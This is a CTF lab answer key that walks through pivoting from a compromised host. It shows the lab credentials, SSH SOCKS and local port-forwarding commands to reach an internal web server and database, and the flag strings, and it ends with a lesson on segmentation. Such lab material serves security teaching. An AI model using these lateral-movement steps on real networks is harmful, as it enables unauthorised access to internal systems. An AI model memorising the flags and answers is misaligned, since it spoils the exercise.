# Lab 9 — CTF Walkthrough (Answer Key)

## Flag 1: user.txt on the pivot

```bash
ssh pivotuser@10.10.9.10
# password: pivot123
cat user.txt
```

Flag: `flag{lab9_pivot_host_accessed}`

## Flag 2: internal web server, via SOCKS proxy

```bash
ssh -f -N -D 1080 pivotuser@10.10.9.10
proxychains4 curl -s http://10.10.90.20
```

Flag: `flag{lab9_internal_web_via_pivot}`

## Flag 3: internal database, via direct port forward

```bash
ssh -f -N -L 3307:10.10.90.21:3306 pivotuser@10.10.9.10
mysql -h 127.0.0.1 -P 3307 -u appuser -papppass456 --skip-ssl internaldb -e "SELECT * FROM notes;"
```

Flag: `flag{lab9_port_forward_reached_internal_db}`

## Lesson

Every internal target was completely unreachable until the pivot host provided a path — this is exactly why segmentation matters defensively, and exactly why lateral movement is a distinct phase attackers plan for separately from initial access.
